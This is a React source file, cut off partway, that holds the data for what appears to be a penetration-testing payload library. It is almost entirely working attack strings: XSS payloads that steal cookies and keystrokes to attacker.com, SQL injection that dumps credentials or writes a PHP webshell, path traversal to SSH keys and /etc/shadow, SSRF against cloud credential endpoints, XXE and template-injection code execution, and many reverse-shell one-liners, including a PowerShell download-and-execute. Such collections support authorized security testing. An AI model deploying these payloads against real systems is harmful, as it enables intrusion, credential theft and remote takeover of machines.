// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import React, { useState } from "react";
import { usePersistedState } from "@/hooks/usePersistedState";

interface PayloadCategory {
  key: string;
  label: string;
  description: string;
  color: string;
  payloads: { name: string; payload: string; note?: string }[];
}

const CATEGORIES: PayloadCategory[] = [
  {
    key: "xss",
    label: "XSS",
    description: "Cross-Site Scripting — reflected, stored, DOM, WAF-bypass polyglots",
    color: "text-orange-400",
    payloads: [
      { name: "Basic script tag",                payload: `<script>alert(1)</script>` },
      { name: "Image onerror",                   payload: `<img src=x onerror=alert(1)>` },
      { name: "SVG onload",                      payload: `<svg onload=alert(1)>` },
      { name: "Body tag",                        payload: `<body onload=alert(1)>` },
      { name: "JavaScript URI",                  payload: `javascript:alert(1)` },
      { name: "DOM XSS (innerHTML)",             payload: `<div id=x></div><script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>` },
      { name: "Input autofocus onfocus",         payload: `<input onfocus=alert(1) autofocus>` },
      { name: "Details/summary ontoggle",        payload: `<details open ontoggle=alert(1)>` },
      { name: "iframe srcdoc",                   payload: `<iframe srcdoc="<script>alert(1)</script>">` },
      { name: "Object data",                     payload: `<object data="javascript:alert(1)">` },
      { name: "Video onerror",                   payload: `<video src=1 onerror=alert(1)>` },
      { name: "Audio onerror",                   payload: `<audio src=1 onerror=alert(1)>` },
      { name: "Event handler polyglot",          payload: `" onmouseover=alert(1) x="` },
      { name: "Double-encoded",                  payload: `%3Cscript%3Ealert(1)%3C/script%3E` },
      { name: "Unicode bypass",                  payload: `\u003cscript\u003ealert(1)\u003c/script\u003e` },
      { name: "Angle bracket bypass",            payload: `&lt;script&gt;alert(1)&lt;/script&gt;` },
      { name: "Cookie theft (fetch)",            payload: `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`, note: "Replace attacker.com" },
      { name: "Cookie theft (image)",            payload: `<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">`, note: "Replace attacker.com" },
      { name: "Keylogger",                       payload: `<script>document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}</script>`, note: "Replace attacker.com" },
      { name: "Page exfil (fetch)",              payload: `<script>fetch('https://attacker.com/',{method:'POST',body:document.documentElement.innerHTML})</script>`, note: "Replace attacker.com" },
      { name: "MathML",                          payload: `<math><maction actiontype="statusline#x" xlink:href="javascript:alert(1)">click</maction></math>` },
      { name: "Template literal",                payload: "`${alert(1)}`" },
      { name: "Polyglot WAF bypass",            payload: `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>` },
      { name: "Filter bypass — script case",    payload: `<ScRiPt>alert(1)</sCrIpT>` },
      { name: "Filter bypass — tag splitting",  payload: `<scr<script>ipt>alert(1)</scr</script>ipt>` },
      { name: "Filter bypass — null byte",      payload: `<scr\x00ipt>alert(1)</scr\x00ipt>` },
      { name: "Filter bypass — HTML entities",  payload: `<img src=x o&#110;error=alert(1)>` },
      { name: "Filter bypass — tab in tag",     payload: `<img  src=x   onerror=alert(1)>` },
      { name: "CSP bypass — JSONP",             payload: `"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`, note: "Works when CSP allows Google" },
      { name: "DOM — location.hash sink",       payload: `#<img src=x onerror=alert(1)>` },
      { name: "Angular template injection",      payload: `{{constructor.constructor('alert(1)')()}}` },
      { name: "Vue template injection",          payload: `{{_Vue.prototype.$nextTick.call({_self:{_c:eval}},alert,1)}}` },
      { name: "Stored XSS — SVG upload",        payload: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`, note: "Upload as .svg file" },
      { name: "XSS to CSRF (form submit)",      payload: `<script>var f=document.createElement('form');f.method='POST';f.action='/admin/delete-user';var i=document.createElement('input');i.name='id';i.value='1';f.appendChild(i);document.body.appendChild(f);f.submit()</script>` },
    ],
  },
  {
    key: "sqli",
    label: "SQL Injection",
    description: "Boolean-blind, UNION, time-based, error-based, stacked queries, WAF bypass",
    color: "text-red-400",
    payloads: [
      { name: "Boolean true",                   payload: `' OR '1'='1` },
      { name: "Boolean true (comment)",         payload: `' OR 1=1--` },
      { name: "Boolean true (hash)",            payload: `' OR 1=1#` },
      { name: "Boolean — admin login bypass",   payload: `admin'--` },
      { name: "Boolean — parenthesis",          payload: `') OR ('1'='1` },
      { name: "Union 1 col",                    payload: `' UNION SELECT NULL--` },
      { name: "Union 2 cols",                   payload: `' UNION SELECT NULL,NULL--` },
      { name: "Union 3 cols",                   payload: `' UNION SELECT NULL,NULL,NULL--` },
      { name: "Union — version (MySQL)",        payload: `' UNION SELECT @@version,NULL--` },
      { name: "Union — user/db",               payload: `' UNION SELECT user(),database()--` },
      { name: "Union — all tables",             payload: `' UNION SELECT table_name,NULL FROM information_schema.tables--` },
      { name: "Union — all columns",            payload: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--` },
      { name: "Union — dump creds",             payload: `' UNION SELECT username,password FROM users--` },
      { name: "Error-based (MySQL extractvalue)",payload: `' AND extractvalue(1,concat(0x7e,version()))--` },
      { name: "Error-based (MySQL updatexml)",   payload: `' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--` },
      { name: "Error-based (MSSQL convert)",     payload: `' AND 1=convert(int,(select top 1 table_name from information_schema.tables))--` },
      { name: "Error-based (PostgreSQL)",        payload: `' AND 1=cast((SELECT version()) as int)--` },
      { name: "Time-based (MySQL sleep)",        payload: `' OR SLEEP(5)--`, note: "Look for 5s delay" },
      { name: "Time-based (MSSQL waitfor)",      payload: `'; WAITFOR DELAY '0:0:5'--`, note: "Look for 5s delay" },
      { name: "Time-based (PostgreSQL)",         payload: `'; SELECT pg_sleep(5)--`, note: "Look for 5s delay" },
      { name: "Time-based — conditional",        payload: `' AND IF(1=1,SLEEP(5),0)--`, note: "Sleep only on true condition" },
      { name: "Stacked — MySQL",                payload: `'; INSERT INTO users(name) VALUES('hacked');--` },
      { name: "Column count (ORDER BY)",         payload: `' ORDER BY 1--` },
      { name: "Version disclosure",              payload: `' UNION SELECT @@version,NULL--` },
      { name: "File read (MySQL)",               payload: `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--`, note: "Requires FILE privilege" },
      { name: "File write (MySQL webshell)",     payload: `' UNION SELECT '<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/shell.php'--`, note: "Requires FILE privilege + write perm" },
      { name: "OS shell (MySQL UDF)",            payload: `'; SELECT sys_exec('id');--`, note: "Requires UDF loaded" },
      { name: "WAF bypass — inline comment",     payload: `' /*!UNION*/ /*!SELECT*/ NULL,NULL--` },
      { name: "WAF bypass — URL encoding",       payload: `%27%20OR%201%3D1--` },
      { name: "WAF bypass — case variation",     payload: `' uNiOn SeLeCt NULL,NULL--` },
      { name: "WAF bypass — hex encoding",       payload: `' UNION SELECT 0x61646d696e,NULL--`, note: "0x61646d696e = 'admin'" },
      { name: "WAF bypass — newline",            payload: `'\nOR\n1=1--` },
      { name: "WAF bypass — scientific notation",payload: `' OR 1e0=1e0--` },
      { name: "NoSQL bypass (MongoDB)",          payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`, note: "POST body for MongoDB login bypass" },
      { name: "SQLite — dump tables",            payload: `' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--` },
      { name: "Oracle — version",               payload: `' UNION SELECT banner,NULL FROM v$version--` },
      { name: "Oracle — all tables",            payload: `' UNION SELECT table_name,NULL FROM all_tables--` },
      { name: "2nd order injection",             payload: `admin'--`, note: "Store in profile, execute on next query that reads profile" },
    ],
  },
  {
    key: "cmdi",
    label: "Command Injection",
    description: "OS command injection — separators, blind OOB, reverse shells, Windows payloads",
    color: "text-yellow-400",
    payloads: [
      { name: "Semicolon separator",            payload: `; id` },
      { name: "Pipe",                           payload: `| id` },
      { name: "AND operator",                   payload: `&& id` },
      { name: "OR operator",                    payload: `|| id` },
      { name: "Backtick",                       payload: "`id`" },
      { name: "Subshell $(...)",                payload: `$(id)` },
      { name: "Newline",                        payload: `\nid` },
      { name: "Null byte",                      payload: `%00; id` },
      { name: "Time-based blind",               payload: `; sleep 5`, note: "Look for 5s delay" },
      { name: "DNS OOB (curl)",                 payload: `; curl http://attacker.com/$(id)`, note: "Replace attacker.com" },
      { name: "DNS OOB (wget)",                 payload: `; wget http://attacker.com/?x=$(whoami)`, note: "Replace attacker.com" },
      { name: "DNS OOB (nslookup)",             payload: `; nslookup $(whoami).attacker.com`, note: "Replace attacker.com" },
      { name: "Reverse shell — bash TCP",       payload: `; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, note: "Replace IP:port, listen: nc -lvnp 4444" },
      { name: "Reverse shell — bash UDP",       payload: `; bash -i >& /dev/udp/10.0.0.1/4444 0>&1`, note: "Replace IP:port" },
      { name: "Reverse shell — netcat (e)",     payload: `; nc -e /bin/bash 10.0.0.1 4444`, note: "Replace IP:port" },
      { name: "Reverse shell — netcat (mkfifo)",payload: `; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f`, note: "Replace IP:port" },
      { name: "Reverse shell — Python 3",       payload: `; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, note: "Replace IP:port" },
      { name: "Reverse shell — Python 2",       payload: `; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`, note: "Replace IP:port" },
      { name: "Reverse shell — Perl",           payload: `; perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, note: "Replace IP:port" },
      { name: "Reverse shell — Ruby",           payload: `; ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, note: "Replace IP:port" },
      { name: "Reverse shell — PHP",            payload: `; php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`, note: "Replace IP:port" },
      { name: "Reverse shell — PowerShell",     payload: `; powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`, note: "Replace IP:port" },
      { name: "Upgrade shell — pty (Python)",   payload: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, note: "Run after getting a shell to get full TTY" },
      { name: "Windows cmd — ipconfig",         payload: `& ipconfig /all` },
      { name: "Windows — whoami",               payload: `& whoami /all` },
      { name: "Windows — list users",           payload: `& net user` },
      { name: "Windows — add user",             payload: `& net user hacker Password1! /add && net localgroup administrators hacker /add`, note: "Creates admin user" },
      { name: "Windows — reverse shell PS",     payload: `& powershell IEX(New-Object Net.WebClient).downloadString('http://10.0.0.1/shell.ps1')`, note: "Host shell.ps1 on attacker" },
      { name: "Filter bypass — IFS",            payload: "\${IFS}id" },
      { name: "Filter bypass — brace expansion", payload: "{id}" },
      { name: "Filter bypass — hex",            payload: `$(printf '\\x69\\x64')`, note: "Decodes to 'id'" },
    ],
  },
  {
    key: "lfi",
    label: "LFI / Path Traversal",
    description: "Local file inclusion, directory traversal, PHP wrappers, log poisoning",
    color: "text-blue-400",
    payloads: [
      { name: "Linux /etc/passwd",              payload: `../../../etc/passwd` },
      { name: "Linux /etc/shadow",              payload: `../../../../etc/shadow` },
      { name: "Linux /etc/hosts",               payload: `../../../../etc/hosts` },
      { name: "Linux /proc/version",            payload: `../../../../proc/version` },
      { name: "Linux /proc/self/environ",       payload: `../../../../proc/self/environ`, note: "Leaks env vars including HTTP headers" },
      { name: "Linux /proc/self/cmdline",       payload: `../../../../proc/self/cmdline` },
      { name: "Linux — SSH private key",        payload: `../../../../root/.ssh/id_rsa` },
      { name: "Linux — SSH private key (user)", payload: `../../../../home/ubuntu/.ssh/id_rsa` },
      { name: "Linux — authorized_keys",        payload: `../../../../root/.ssh/authorized_keys` },
      { name: "Linux — bash history (root)",    payload: `../../../../root/.bash_history` },
      { name: "Linux — app .env",              payload: `../../../../var/www/html/.env` },
      { name: "Linux — wp-config.php",         payload: `../../../../var/www/html/wp-config.php` },
      { name: "Linux — Apache access log",      payload: `../../../../var/log/apache2/access.log`, note: "Log poisoning: inject PHP via User-Agent first" },
      { name: "Linux — Nginx access log",       payload: `../../../../var/log/nginx/access.log` },
      { name: "Linux — SSH auth log",           payload: `../../../../var/log/auth.log`, note: "Log poisoning via SSH username" },
      { name: "Linux — mail log",              payload: `../../../../var/log/mail.log` },
      { name: "Double encoding",               payload: `..%2F..%2F..%2Fetc%2Fpasswd` },
      { name: "URL encoded",                   payload: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` },
      { name: "Null byte bypass",              payload: `../../../etc/passwd%00`, note: "Old PHP versions" },
      { name: "Backslash bypass",              payload: `..\\..\\..\\etc\\passwd` },
      { name: "Mixed separator",              payload: `..%5C..%5C..%5Cetc%5Cpasswd` },
      { name: "16 dots bypass",               payload: `....//....//....//etc/passwd` },
      { name: "PHP filter — base64 encode",    payload: `php://filter/read=convert.base64-encode/resource=index.php`, note: "Leak PHP source code" },
      { name: "PHP filter — ROT13",            payload: `php://filter/read=string.rot13/resource=index.php` },
      { name: "PHP filter — /etc/passwd",      payload: `php://filter/convert.base64-encode/resource=/etc/passwd` },
      { name: "PHP data — execute code",       payload: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`, note: "data:// LFI→RCE" },
      { name: "PHP input wrapper",             payload: `php://input`, note: "POST body: <?php system('id'); ?>" },
      { name: "ZIP wrapper (zip://)",          payload: `zip://shell.zip#shell.php`, note: "Upload zip containing shell.php" },
      { name: "Phar wrapper",                  payload: `phar://shell.phar/shell.php`, note: "PHP object injection via phar" },
      { name: "Log poisoning — Apache UA",     payload: `<?php system($_GET['cmd']); ?>`, note: "Send as User-Agent, then LFI the access.log" },
      { name: "Windows — SYSTEM32 hosts",      payload: `..\\..\\..\\windows\\system32\\drivers\\etc\\hosts` },
      { name: "Windows — SAM hive",            payload: `..\\..\\..\\windows\\system32\\config\\SAM` },
      { name: "Windows — win.ini",             payload: `..\\..\\..\\windows\\win.ini` },
    ],
  },
  {
    key: "ssrf",
    label: "SSRF",
    description: "Server-Side Request Forgery — internal IPs, cloud metadata, protocol abuse, bypasses",
    color: "text-cyan-400",
    payloads: [
      { name: "Localhost HTTP",                 payload: `http://127.0.0.1/` },
      { name: "Localhost HTTPS",                payload: `https://127.0.0.1/` },
      { name: "Localhost — port 8080",          payload: `http://127.0.0.1:8080/` },
      { name: "Localhost — port 3000",          payload: `http://127.0.0.1:3000/` },
      { name: "Localhost — admin panel",        payload: `http://127.0.0.1/admin` },
      { name: "AWS IMDS v1",                    payload: `http://169.254.169.254/latest/meta-data/` },
      { name: "AWS IMDS — IAM credentials",     payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` },
      { name: "AWS IMDS — user-data",           payload: `http://169.254.169.254/latest/user-data` },
      { name: "AWS IMDS — hostname",            payload: `http://169.254.169.254/latest/meta-data/hostname` },
      { name: "AWS IMDS v2 token",              payload: `http://169.254.169.254/latest/api/token`, note: "PUT request with TTL header needed" },
      { name: "GCP Metadata",                   payload: `http://metadata.google.internal/computeMetadata/v1/`, note: "Requires Metadata-Flavor: Google header" },
      { name: "GCP — service account token",    payload: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` },
      { name: "Azure IMDS",                     payload: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`, note: "Requires Metadata: true header" },
      { name: "DigitalOcean metadata",          payload: `http://169.254.169.254/metadata/v1/` },
      { name: "IPv6 localhost",                 payload: `http://[::1]/` },
      { name: "IPv4 decimal (127.0.0.1)",       payload: `http://2130706433/` },
      { name: "IPv4 hex",                       payload: `http://0x7f000001/` },
      { name: "IPv4 octal",                     payload: `http://0177.0.0.1/` },
      { name: "DNS rebind",                     payload: `http://localtest.me/` },
      { name: "Shortened URL bypass",           payload: `https://nip.io/127.0.0.1`, note: "Use IP-in-hostname DNS services" },
      { name: "File protocol",                  payload: `file:///etc/passwd` },
      { name: "File — Windows hosts",           payload: `file:///C:/Windows/System32/drivers/etc/hosts` },
      { name: "Gopher — Redis ping",            payload: `gopher://127.0.0.1:6379/_PING%0D%0A` },
      { name: "Gopher — Redis auth bypass",     payload: `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A`, note: "Flush all Redis keys" },
      { name: "Gopher — Memcached",             payload: `gopher://127.0.0.1:11211/_stats` },
      { name: "Dict protocol",                  payload: `dict://localhost:11211/` },
      { name: "LDAP protocol",                  payload: `ldap://localhost:389/` },
      { name: "FTP protocol",                   payload: `ftp://127.0.0.1/etc/passwd` },
      { name: "0.0.0.0 bypass",                 payload: `http://0.0.0.0:80/` },
      { name: "Private range — 10.x.x.x",      payload: `http://10.0.0.1/` },
      { name: "Private range — 192.168.x.x",   payload: `http://192.168.1.1/` },
      { name: "Private range — 172.16.x.x",    payload: `http://172.16.0.1/` },
    ],
  },
  {
    key: "xxe",
    label: "XXE",
    description: "XML External Entity injection — file read, SSRF, blind OOB",
    color: "text-pink-400",
    payloads: [
      {
        name: "Classic file read (/etc/passwd)",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
      },
      {
        name: "File read — /etc/shadow",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>`,
      },
      {
        name: "File read — Windows hosts",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><foo>&xxe;</foo>`,
      },
      {
        name: "SSRF via XXE",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
        note: "AWS IMDS via XXE",
      },
      {
        name: "SSRF — internal service",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]><foo>&xxe;</foo>`,
      },
      {
        name: "Blind XXE (DNS OOB)",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>`,
        note: "Replace attacker.com — host evil.dtd remotely",
      },
      {
        name: "Blind XXE via parameter entity",
        payload: `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><data/>`,
        note: "evil.dtd: <!ENTITY % all '<!ENTITY send SYSTEM \"http://attacker.com/?%file;\">'>%all;",
      },
      {
        name: "XXE via SVG (image upload)",
        payload: `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="10">&xxe;</text></svg>`,
        note: "Upload as .svg image",
      },
      {
        name: "XXE via Excel (docx/xlsx)",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
        note: "Inject into xl/sharedStrings.xml inside .xlsx ZIP",
      },
      {
        name: "Error-based XXE (exfil via error)",
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///notexist/%file;'>">%eval;%exfil;]>`,
        note: "Exfil via error message",
      },
    ],
  },
  {
    key: "ssti",
    label: "SSTI",
    description: "Server-Side Template Injection — detect, RCE via Jinja2, Twig, Freemarker, ERB",
    color: "text-violet-400",
    payloads: [
      { name: "Detection — math (all engines)",  payload: `{{7*7}}`, note: "Expect 49" },
      { name: "Detection — Freemarker/Velocity", payload: "${7*7}", note: "Expect 49" },
      { name: "Detection — ERB (Ruby)",          payload: `<%= 7*7 %>`, note: "Expect 49" },
      { name: "Detection — Smarty",              payload: `{7*7}`, note: "Expect 49" },
      { name: "Detection — Velocity",            payload: "#set($x=7*7)${x}", note: "Expect 49" },
      { name: "Jinja2 — config dump",            payload: `{{config}}` },
      { name: "Jinja2 — RCE (os.system)",        payload: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` },
      { name: "Jinja2 — RCE (subprocess)",       payload: `{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}` },
      { name: "Jinja2 — RCE (lipsum bypass)",    payload: `{{lipsum.__globals__['os'].popen('id').read()}}` },
      { name: "Jinja2 — RCE (request object)",   payload: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` },
      { name: "Jinja2 — reverse shell",          payload: `{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1').read()}}`, note: "Replace IP:port" },
      { name: "Twig — RCE",                      payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` },
      { name: "Twig — RCE (system)",             payload: `{{['id']|filter('system')}}` },
      { name: "Freemarker — detect",             payload: "${7*7}", note: "Expect 49" },
      { name: "Freemarker — RCE",                payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' },
      { name: "Freemarker — RCE (api)",          payload: `<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>` },
      { name: "Velocity — RCE",                  payload: `#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')` },
      { name: "ERB (Ruby) — detect",             payload: `<%= 7*7 %>`, note: "Expect 49" },
      { name: "ERB (Ruby) — RCE",                payload: `<%= system("id") %>` },
      { name: "Pebble — RCE",                    payload: `{{''.class.forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''.class.forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'id'.split(' '))[1].text}}` },
    ],
  },
  {
    key: "nosql",
    label: "NoSQL Injection",
    description: "MongoDB operator injection, authentication bypass, data extraction",
    color: "text-green-400",
    payloads: [
      { name: "MongoDB auth bypass ($ne)",       payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`, note: "POST body (JSON)" },
      { name: "MongoDB auth bypass ($gt)",       payload: `{"username": {"$gt": ""}, "password": {"$gt": ""}}`, note: "POST body (JSON)" },
      { name: "MongoDB always-true ($regex)",    payload: `{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}`, note: "POST body (JSON)" },
      { name: "MongoDB URL param bypass",        payload: `?username[$ne]=invalid&password[$ne]=invalid`, note: "URL param injection for Mongoose" },
      { name: "MongoDB — $where JS eval",        payload: `{"$where": "function(){return true}"}`, note: "Enables JS execution in old MongoDB" },
      { name: "MongoDB — sleep (blind)",         payload: `{"$where": "function(){sleep(5000); return true}"}`, note: "5s delay if vulnerable" },
      { name: "MongoDB — exfil username",        payload: `{"$where": "function(){return (this.username.charAt(0)=='a')}"}`, note: "Blind character extraction" },
      { name: "MongoDB — regex extract",         payload: `{"username": {"$regex": "^a"}, "password": {"$ne": null}}`, note: "Brute-force username with binary search" },
      { name: "CouchDB — auth bypass",           payload: `{"username": "admin", "password": {"$gt": ""}}` },
      { name: "Elasticsearch — all docs",        payload: `{"query": {"match_all": {}}}`, note: "POST to /index/_search" },
      { name: "Redis — command injection",       payload: `test\r\nSET malicious payload\r\n`, note: "CRLF injection into Redis protocol" },
    ],
  },
  {
    key: "reverse_shells",
    label: "Reverse Shells",
    description: "Ready-to-use reverse shell one-liners — replace IP:port before using",
    color: "text-red-300",
    payloads: [
      { name: "Bash TCP",                        payload: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, note: "Listen: nc -lvnp 4444" },
      { name: "Bash UDP",                        payload: `bash -i >& /dev/udp/10.0.0.1/4444 0>&1`, note: "Listen: nc -u -lvnp 4444" },
      { name: "Bash 196",                        payload: `0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196` },
      { name: "Netcat (with -e)",                payload: `nc -e /bin/bash 10.0.0.1 4444` },
      { name: "Netcat (without -e, mkfifo)",     payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f` },
      { name: "Netcat (without -e, /dev/tcp)",   payload: `nc 10.0.0.1 4444|/bin/sh|nc 10.0.0.1 4445` },
      { name: "Python 3",                        payload: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
      { name: "Python 2",                        payload: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'` },
      { name: "PHP (system)",                    payload: `php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` },
      { name: "PHP (shell_exec loop)",           payload: `php -r '$s=fsockopen("10.0.0.1",4444);while(!feof($s)){$c=fgets($s,1024);$o=shell_exec($c);fwrite($s,$o);}'` },
      { name: "Ruby",                            payload: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
      { name: "Perl",                            payload: `perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` },
      { name: "Go",                              payload: `echo 'package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","10.0.0.1:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go` },
      { name: "Socat",                           payload: `socat tcp-connect:10.0.0.1:4444 exec:"bash -li",pty,stderr,setsid,sigint,sane` },
      { name: "Socat (encrypted)",               payload: `socat OPENSSL:10.0.0.1:4444,verify=0 exec:"bash -li",pty,stderr,setsid,sigint,sane`, note: "Listen: socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0 FILE:\`tty\`,raw,echo=0" },
      { name: "PowerShell — IEX download",       payload: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://10.0.0.1/shell.ps1')"`, note: "Host Invoke-PowerShellTcp.ps1" },
      { name: "PowerShell — TCP socket",         payload: `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"` },
      { name: "Node.js",                         payload: `node -e "var s=require('net').createConnection({port:4444,host:'10.0.0.1'},function(){var sh=require('child_process').spawn('/bin/sh');sh.stdout.pipe(s);sh.stderr.pipe(s);s.pipe(sh.stdin)})"` },
      { name: "Java",                            payload: `r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor()` },
      { name: "Awk",                             payload: `awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4444"; while(42) {do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
      { name: "Upgrade shell — Python pty",      payload: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, note: "Upgrade dumb shell → full TTY" },
      { name: "Upgrade shell — stty",            payload: `stty raw -echo; fg`, note: "After Ctrl+Z, on attacker machine" },
    ],
  },
  {
    key: "waf_bypass",
    label: "WAF Bypass",
    description: "Techniques to evade Web Application Firewalls — encoding, case, comments, chunked",
    color: "text-amber-400",
    payloads: [
      { name: "SQLi — inline comment",           payload: `' /*!UNION*/ /*!SELECT*/ NULL,NULL--` },
